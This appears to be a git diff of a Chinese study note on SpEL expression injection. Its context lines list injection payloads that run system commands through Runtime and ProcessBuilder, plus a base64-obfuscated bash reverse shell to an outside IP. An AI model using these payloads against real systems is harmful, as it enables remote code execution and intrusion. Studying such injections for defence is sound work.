@@ -32,8 +32,6 @@ new String[]{"/bin/bash\","-c","xxxxx"}
 
 ![image-20231218210130042](SpEl命令执行.assets\image-20231218210130042.png)
 
-
-
 ## ①
 
 在JAVA中利用`Runtime`和`ProcessBuilder`类来使用Java执行Shell命令和脚本
@@ -46,7 +44,7 @@ Process process = Runtime.getRuntime().exec("ping");
 
 ```java
 T(java.lang.Runtime).getRuntime().exec('calc.exe')
-    
+
 T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS4xMDcuKioqLioqKi85MDAyIDA+JjE=}|{base64,-d}|{bash,-i}")
 ```
 
@@ -81,7 +79,7 @@ new java.lang.ProcessBuilder("calc").start()
 
 ```java
 payload=new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "gbk")).readLine()
-    
+
 new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "gbk")).readLine()
 ```
 
@@ -104,8 +102,6 @@ new java.util.Scanner(new java.lang.ProcessBuilder("cmd", "/c", "dir", ".\\").st
 ```
 ${new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()}
 ```
-
-
 
 #### trick：
 
@@ -140,8 +136,6 @@ ${…} 主要用于加载外部属性文件中的值
 改变remember-me的值，服务器上就可以收到请求
 
 ![image-20231218211823043](F:\笔记\WEB\Java\SpEl命令执行.assets\image-20231218211823043.png)
-
-
 
 推荐博客：https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/#ClassLoader
 
